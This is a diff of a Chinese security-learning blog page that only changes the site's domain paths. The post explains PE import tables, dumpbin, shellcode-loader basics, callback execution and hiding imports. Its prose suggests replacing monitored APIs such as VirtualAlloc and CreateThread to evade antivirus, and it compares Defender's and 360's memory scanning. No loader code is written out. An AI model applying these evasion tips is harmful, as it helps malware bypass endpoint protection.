@@ -5,60 +5,60 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 6.0.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/wan1/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/wan1/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/wan1/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/wan1/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/wan1/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/wan1/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"wanheiqiyihu.gitee.io","root":"/wan1/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"wanheiqiyihu.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="C语言3-IAT表、shellcode loader基础 用名称找函数就放在INT表里面，如果是地址找函数就凡在IAT表里面，虽然我也不是很懂，pe结构我学了几天了，暂时不想学了，后面再补上。  在pe加载进内存之后，iat表里面就不再指向函数的名称了，而是存储到函数的地址 正常加载函数和dll加载函数现在看看正常函数调用的反汇编 可以看到他的内存是写死了的，但是我们看看调用windowsAPI哈">
 <meta property="og:type" content="article">
 <meta property="og:title" content="C语言3-IAT表、shellcode loader">
-<meta property="og:url" content="https://wanheiqiyihu.gitee.io/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/index.html">
+<meta property="og:url" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/index.html">
 <meta property="og:site_name" content="十三の博客">
 <meta property="og:description" content="C语言3-IAT表、shellcode loader基础 用名称找函数就放在INT表里面，如果是地址找函数就凡在IAT表里面，虽然我也不是很懂，pe结构我学了几天了，暂时不想学了，后面再补上。  在pe加载进内存之后，iat表里面就不再指向函数的名称了，而是存储到函数的地址 正常加载函数和dll加载函数现在看看正常函数调用的反汇编 可以看到他的内存是写死了的，但是我们看看调用windowsAPI哈">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122426842.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122609063.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119123043585.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135902769.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135924070.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119140048733.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144844766.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144951384.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120153125419.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120155029039.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192853804.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192942895.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193151924.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121230255105.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193340506.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193759404.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121194615296.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195141499.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195250452.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121200005252.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213201284.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213557248.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122001700455.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122002614109.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122005256903.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122426842.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122609063.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119123043585.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135902769.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135924070.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119140048733.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144844766.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144951384.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120153125419.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120155029039.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192853804.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192942895.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193151924.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121230255105.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193340506.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193759404.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121194615296.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195141499.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195250452.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121200005252.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213201284.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213557248.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122001700455.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122002614109.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122005256903.png">
 <meta property="article:published_time" content="2024-01-21T16:53:41.000Z">
 <meta property="article:modified_time" content="2024-01-31T12:10:40.096Z">
 <meta property="article:author" content="十三">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wanheiqiyihu.gitee.io/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122426842.png">
+<meta name="twitter:image" content="https://wanheiqiyihu.top/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122426842.png">
 
-<link rel="canonical" href="https://wanheiqiyihu.gitee.io/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/">
+<link rel="canonical" href="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/">
 
 
 <script id="page-configurations">
@@ -120,7 +120,7 @@
 
   <div class="site-meta">
 
-    <a href="/wan1/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">十三の博客</h1>
       <span class="logo-line-after"><i></i></span>
@@ -141,92 +141,92 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/wan1/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/wan1/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-ctf做题笔记">
 
-    <a href="/wan1/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
+    <a href="/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
 
   </li>
         <li class="menu-item menu-item-python">
 
-    <a href="/wan1/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
+    <a href="/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
 
   </li>
         <li class="menu-item menu-item-java">
 
-    <a href="/wan1/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
+    <a href="/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
 
   </li>
         <li class="menu-item menu-item-读书笔记">
 
-    <a href="/wan1/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
+    <a href="/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
 
   </li>
         <li class="menu-item menu-item-渗透测试">
 
-    <a href="/wan1/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
+    <a href="/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
 
   </li>
         <li class="menu-item menu-item-基础">
 
-    <a href="/wan1/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
+    <a href="/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
 
   </li>
         <li class="menu-item menu-item-轮子">
 
-    <a href="/wan1/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
+    <a href="/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
 
   </li>
         <li class="menu-item menu-item-漏洞库">
 
-    <a href="/wan1/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
+    <a href="/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
 
   </li>
         <li class="menu-item menu-item-工具">
 
-    <a href="/wan1/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
+    <a href="/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
 
   </li>
         <li class="menu-item menu-item-代码审计">
 
-    <a href="/wan1/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
+    <a href="/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
 
   </li>
         <li class="menu-item menu-item-逆向">
 
-    <a href="/wan1/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
+    <a href="/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
 
   </li>
         <li class="menu-item menu-item-应急响应">
 
-    <a href="/wan1/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
+    <a href="/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
 
   </li>
         <li class="menu-item menu-item-免杀">
 
-    <a href="/wan1/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
+    <a href="/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
 
   </li>
         <li class="menu-item menu-item-靶场">
 
-    <a href="/wan1/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
+    <a href="/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
 
   </li>
         <li class="menu-item menu-item-cve申请">
 
-    <a href="/wan1/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
+    <a href="/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
 
   </li>
         <li class="menu-item menu-item-c语言">
 
-    <a href="/wan1/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
+    <a href="/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -284,10 +284,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/wan1/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="十三">
       <meta itemprop="description" content="潜心学习，不骄不躁">
     </span>
@@ -322,7 +322,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/wan1/categories/miansha/" itemprop="url" rel="index"><span itemprop="name">-miansha</span></a>
+                  <a href="/categories/miansha/" itemprop="url" rel="index"><span itemprop="name">-miansha</span></a>
                 </span>
             </span>
 
@@ -339,23 +339,23 @@
       
         <h1 id="C语言3-IAT表、shellcode-loader"><a href="#C语言3-IAT表、shellcode-loader" class="headerlink" title="C语言3-IAT表、shellcode loader"></a>C语言3-IAT表、shellcode loader</h1><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p><img src="/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122426842.png" alt="image-20240119122426842"></p>
 <p>用名称找函数就放在INT表里面，如果是地址找函数就凡在IAT表里面，虽然我也不是很懂，pe结构我学了几天了，暂时不想学了，后面再补上。</p>
-<p><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122609063.png" alt="image-20240119122609063"></p>
+<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122609063.png" alt="image-20240119122609063"></p>
 <p>在pe加载进内存之后，iat表里面就不再指向函数的名称了，而是存储到函数的地址</p>
-<h2 id="正常加载函数和dll加载函数"><a href="#正常加载函数和dll加载函数" class="headerlink" title="正常加载函数和dll加载函数"></a>正常加载函数和dll加载函数</h2><p>现在看看正常函数调用的反汇编<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119123043585.png" alt="image-20240119123043585"></p>
-<p>可以看到他的内存是写死了的，但是我们看看调用windowsAPI哈，这个就是跳到dll<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135902769.png" alt="image-20240119135902769"><br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135924070.png" alt="image-20240119135924070"><br>继续往下更进<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119140048733.png" alt="image-20240119140048733"><br>最后发现跳到一个7开头的内存地址，这个7开头的内存地址绝对不是程序本身的内存地址了，就是不再程序的堆栈里面，因为可以看到刚刚我们的反汇编里面，基本都是0开头的，所以这个7开头的肯定是dll里面去了。<br>这里解释一下，由于程序加载进内存的时候，还会加载很多的dll，而为了防止出错，程序不会把任何两个dll文件加载进同一块内存中。可是这个时候就出现了一个问题，如果我本来存dll的内存块被我自己的一个dll文件占领了呢？那么，就会把原来存在这个dll挤开，所以dll的地址都是动态的，存到内存中的，就像上面那张图片，call到一个内存地址中取，而那个地址就存有目标dll的内存地址。</p>
-<h2 id="从导入表查看函数"><a href="#从导入表查看函数" class="headerlink" title="从导入表查看函数"></a>从导入表查看函数</h2><p>这里使用vs自带的dumpbin来看看<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144844766.png" alt="image-20240119144844766"><br>命令如下<code>dumpbin.exe /imports 目标文件路径</code><br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144951384.png" alt="image-20240119144951384"><br>可以看到哈（用的就是上面那个程序），这里就可以从导入表看到这个这个东西。</p>
+<h2 id="正常加载函数和dll加载函数"><a href="#正常加载函数和dll加载函数" class="headerlink" title="正常加载函数和dll加载函数"></a>正常加载函数和dll加载函数</h2><p>现在看看正常函数调用的反汇编<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119123043585.png" alt="image-20240119123043585"></p>
+<p>可以看到他的内存是写死了的，但是我们看看调用windowsAPI哈，这个就是跳到dll<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135902769.png" alt="image-20240119135902769"><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135924070.png" alt="image-20240119135924070"><br>继续往下更进<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119140048733.png" alt="image-20240119140048733"><br>最后发现跳到一个7开头的内存地址，这个7开头的内存地址绝对不是程序本身的内存地址了，就是不再程序的堆栈里面，因为可以看到刚刚我们的反汇编里面，基本都是0开头的，所以这个7开头的肯定是dll里面去了。<br>这里解释一下，由于程序加载进内存的时候，还会加载很多的dll，而为了防止出错，程序不会把任何两个dll文件加载进同一块内存中。可是这个时候就出现了一个问题，如果我本来存dll的内存块被我自己的一个dll文件占领了呢？那么，就会把原来存在这个dll挤开，所以dll的地址都是动态的，存到内存中的，就像上面那张图片，call到一个内存地址中取，而那个地址就存有目标dll的内存地址。</p>
+<h2 id="从导入表查看函数"><a href="#从导入表查看函数" class="headerlink" title="从导入表查看函数"></a>从导入表查看函数</h2><p>这里使用vs自带的dumpbin来看看<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144844766.png" alt="image-20240119144844766"><br>命令如下<code>dumpbin.exe /imports 目标文件路径</code><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144951384.png" alt="image-20240119144951384"><br>可以看到哈（用的就是上面那个程序），这里就可以从导入表看到这个这个东西。</p>
 <h1 id="shellcode-loader"><a href="#shellcode-loader" class="headerlink" title="shellcode loader"></a>shellcode loader</h1><p>我之前其实作为门外汉研究过平时的shellcode loader代码，在我的blog里面其实也有写，可以看看。当时还局限于加密解密shellcode，现在系统学习免杀，不断提高捏。</p>
-<p>要搜这些api的官方文档用msdn就可，不是csdn哈。<br>而shellcode loader的编写也有两种方法，可以用指针执行，也可以用汇编语句执行。<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120153125419.png" alt="image-20240120153125419"><br>其中对于免杀来说，类似VirtualAlloc  CreateThread Write ProcessMemory这些api肯定是被重点监控的，我们可以进行一些替换例如VirtualAlloc</p>
+<p>要搜这些api的官方文档用msdn就可，不是csdn哈。<br>而shellcode loader的编写也有两种方法，可以用指针执行，也可以用汇编语句执行。<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120153125419.png" alt="image-20240120153125419"><br>其中对于免杀来说，类似VirtualAlloc  CreateThread Write ProcessMemory这些api肯定是被重点监控的，我们可以进行一些替换例如VirtualAlloc</p>
 <p>虽然可以替换api，但是本质上，要让shellcode跑起来，必须要一块可读可写可执行的内存对吧，所以我们替换这些api，其实只是让杀软不那么在意你申请的内存，因为上面的api都是些敏感的api了。</p>
-<h2 id="回调函数机制"><a href="#回调函数机制" class="headerlink" title="回调函数机制"></a>回调函数机制</h2><p>把一段可执行的代码像参数传递那样给其他代码，而这段代码会在某个时刻被调用执行，这就叫做回调。如果代码立即被执行就称为同步回调，如果在之后晚点的某个时间再执行，则称之为异步回调。<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120155029039.png" alt="image-20240120155029039"></p>
+<h2 id="回调函数机制"><a href="#回调函数机制" class="headerlink" title="回调函数机制"></a>回调函数机制</h2><p>把一段可执行的代码像参数传递那样给其他代码，而这段代码会在某个时刻被调用执行，这就叫做回调。如果代码立即被执行就称为同步回调，如果在之后晚点的某个时间再执行，则称之为异步回调。<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120155029039.png" alt="image-20240120155029039"></p>
 <p>同样图片中的</p>
 <p>扩展：defender有内存查杀，但是360没有</p>
 <h2 id="经典的隐藏导入表"><a href="#经典的隐藏导入表" class="headerlink" title="经典的隐藏导入表"></a>经典的隐藏导入表</h2><h3 id="双机调试环境"><a href="#双机调试环境" class="headerlink" title="双机调试环境"></a>双机调试环境</h3><p>扩展：搭建双机调试环境（可以自己看看百度）  windbg</p>
 <p>每个线程都有一个TEB结构来存储线程的一些属性结构，TEB的地址用fs:[0]来获取</p>
-<p><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192853804.png" alt="image-20240121192853804"></p>
-<p><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192942895.png" alt="image-20240121192942895"></p>
-<p>很好，开始看不懂了。哦，懂了，就是就是我们要定位一个dll的地址的话，可以进行如下操作<br><img src="/wan1/wan1/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193151924.png" alt="image-20240121193151924"><br>这个就要用那个双机调试环境，具体可以百度（我后续会单独发文）</p>
